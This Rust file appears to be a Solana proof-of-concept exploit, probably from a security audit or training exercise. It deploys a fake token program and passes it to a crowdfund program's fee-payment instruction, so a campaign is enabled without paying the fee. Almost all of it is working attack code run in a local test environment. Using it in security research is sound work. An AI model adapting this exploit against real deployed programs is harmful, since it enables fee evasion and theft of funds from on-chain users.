use solana_program::{
    pubkey::{Pubkey, PubkeyError},
    system_program,
};

use spl_token::state::Account as TokenAccount;

use std::env;

use poc_framework::{
    borsh::BorshSerialize,
    keypair,
    solana_sdk::{signature::Keypair, signer::Signer},
    spl_associated_token_account::get_associated_token_address,
    Environment, LocalEnvironment, PrintableTransaction,
};

use owo_colors::OwoColorize;

use crowdfund::{instruction::ix_pay_enable_fee, state::CampaignAccount};

struct Poc {
    campaign_account: Keypair,
    authority_pda: Pubkey,
    creator: Keypair,
    creator_token_account: Pubkey,
    fee_vault: Pubkey,
    crowd_funding_program_id: Pubkey,
}

pub fn main() {
    let (mut env, poc) = build_env();

    let fee_vault_account: TokenAccount = env.get_unpacked_account(poc.fee_vault).unwrap();

    let before_balance: u64 = fee_vault_account.amount;

    hack(&mut env, &poc);
    verify(before_balance, fee_vault_account);
}

fn hack(env: &mut LocalEnvironment, poc: &Poc) {
    // fee_amount for convenience
    let fee_amount: u64 = 50000000;

    // Create a path to the Proof Of Concept program
    let mut dir2poc = env::current_exe().unwrap();
    let path2poc = {
        dir2poc.pop();
        dir2poc.pop();
        dir2poc.push("deploy");
        dir2poc.push("poc_program.so");
        dir2poc.to_str()
    }
    .unwrap();

    // Deploy the POC program. Save the PubKey to the variable
    let forked_token_program = env.deploy_program(path2poc);

    println!(
        "{} The adddress is {}",
        "Forked Token Program has been deployed.".blue(),
        &forked_token_program.red()
    );

    // Send the prepared transaction using the helper function from the Farm program
    let tx_create = env.execute_as_transaction(
        &[ix_pay_enable_fee(
            &poc.campaign_account.pubkey(),
            &poc.authority_pda,
            &poc.creator.pubkey(),
            &poc.creator_token_account,
            &poc.fee_vault,
            &forked_token_program,
            &poc.crowd_funding_program_id,
            fee_amount,
        )],
        &[&poc.creator],
    );

    // observe the malicious Proof od Concept program is invoked
    tx_create.print_named("Proof Of Concept log");
    println!("{:#?}", tx_create.transaction.meta.unwrap());
    println!(
        "{}",
        "The Fake Token Program was invoked. And the campaign (without paying the fee) was enabled"
            .red()
    );
}

// verification phase
fn verify(before_balance: u64, fee_vault_account: TokenAccount) {
    let after_balance = fee_vault_account.amount;

    println!(
        "The initial before_balance of the fee_vault was {:?}. 
        after_balance is {:?}. This means that nothing was paid for the enablement",
        before_balance.green(),
        after_balance.red()
    );
}

// build environment phase
fn build_env() -> (LocalEnvironment, Poc) {
    // define amounts for convenience

    let initial_balance: u64 = 10000000000;

    // create a path to the farm program
    let mut dir = env::current_exe().unwrap();
    let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("crowdfund.so");
        dir.to_str()
    }
    .unwrap();

    // Create accounts
    // 1. 'Crowd Fund Program ID'
    let crowd_funding_program_id = keypair(88).pubkey();

    // 2. 'campaign account'. This is a campaign state holder
    let campaign_account = keypair(0);

    // 3. 'PDA'. Derived from 'CFP ID', 'campaign account'
    let authority_pda =
        authority_id(&crowd_funding_program_id, &campaign_account.pubkey(), 99).unwrap();

    // 4. 'creator account'
    let creator = keypair(10);

    // 5. 'USDC Token mint address'
    let usdc_token_mint = keypair(99).pubkey();

    // 6. 'fee vault' ATA ('USDC Token Account' associated with the 'authority_pda' wallet)
    let fee_vault = get_associated_token_address(&authority_pda, &usdc_token_mint);

    // 7. 'creator ATA' ('USDC Token Account' associated with the 'creator' wallet)
    let creator_token_account = get_associated_token_address(&creator.pubkey(), &usdc_token_mint);

    // initialize campaign data
    let campaign_data = CampaignAccount {
        enabled: 0,
        nonce: 99,
        goal_amount: 100_000_000_000,
        creator: creator.pubkey(),
        fee_vault,
    };

    // serialize the data
    let mut bytes_data: Vec<u8> = vec![];
    campaign_data.serialize(&mut bytes_data).unwrap();

    // build the initial environment
    let env = LocalEnvironment::builder()
        // deploy the Crowd Fund Program
        .add_program(crowd_funding_program_id, path)
        // register 'creator account'
        .add_account_with_lamports(creator.pubkey(), system_program::ID, initial_balance)
        // register 'campaign account' and populate it with the serialized data
        .add_account_with_data(
            campaign_account.pubkey(),
            crowd_funding_program_id,
            bytes_data.as_mut(),
            false,
        )
        // register 'creator ATA'
        .add_associated_account_with_tokens(creator.pubkey(), usdc_token_mint, initial_balance)
        // register 'PDA ATA' --- fee_vault
        .add_associated_account_with_tokens(authority_pda, usdc_token_mint, initial_balance)
        .build();

    (
        env,
        Poc {
            campaign_account,
            authority_pda,
            creator,
            creator_token_account,
            fee_vault,
            crowd_funding_program_id,
        },
    )
}

// Create PDA function
pub fn authority_id(
    program_id: &Pubkey,
    my_info: &Pubkey,
    nonce: u8,
) -> Result<Pubkey, PubkeyError> {
    Pubkey::create_program_address(&[&my_info.to_bytes()[..32], &[nonce]], program_id)
}
